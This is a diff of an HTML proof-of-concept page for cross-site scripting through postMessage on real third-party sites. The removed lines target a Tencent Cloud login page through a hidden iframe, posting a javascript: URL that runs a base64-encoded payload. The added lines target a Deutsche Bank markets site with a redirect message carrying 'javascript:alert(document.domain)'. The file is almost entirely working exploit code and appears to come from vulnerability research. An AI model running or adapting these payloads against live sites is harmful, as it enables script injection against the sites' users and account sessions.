@@ -1,51 +1,27 @@
 <!DOCTYPE html>
 <html>
   <head>
+    
     <meta charset="UTF-8" />
-    <title>Creditnails Exfiltration PoC</title>
-    <script>
-
-      let payload = btoa(`
-      var link=document.createElement('a')
-     link.href="https://intl.cloud.tencent.com/account/login/?sa-visual-mode=true"
-     link.innerHTML="click HEre!"
-     link.target="_blank"
-     document.body.appendChild(link)
-var win;
-link.onclick = function () {
-  win = window.open(link.href, "_blank");
-  return false;
-};
-
-link.click();
-
-setTimeout(() => {
-  win.alert(document.domain)
-}, 2000);
-
-`);
-
-      let msg = {
-        source: "sa-fe",
-        type: "v-track-mode",
-        data: {
-          userURL: `javascript:eval(atob('${payload}'))//`,
-          isVtrack: 1,
-        },
-      };
-
-      setTimeout(function () {
-        iframe.contentWindow.postMessage(msg, "*");
-      }, 4000);
-    </script>
+    <title>Postmessage PoC</title>
+  
   </head>
   <body>
-    <h1>Hi this is a normal page !!!</h1>
-    <iframe
-      id="iframe"
-      src="https://intl.cloud.tencent.com/account/login/subAccount?sa-visual-mode=true"
-      name='{"sa-visual-mode":true}'
-      hidden
-    ></iframe>
+
+<h1> Hi this is a normal page !</h1>
+    <script>
+      let win = window.open("https://www.xmarkets.db.com/");
+      let msg = JSON.stringify({
+        "action": "redirect",
+        "if_redirect": "javascript:alert(document.domain)"
+    });
+
+      setTimeout(function () {
+        win.postMessage(msg, "*");
+      }, 5000);
+
+
+      
+    </script>
   </body>
 </html>
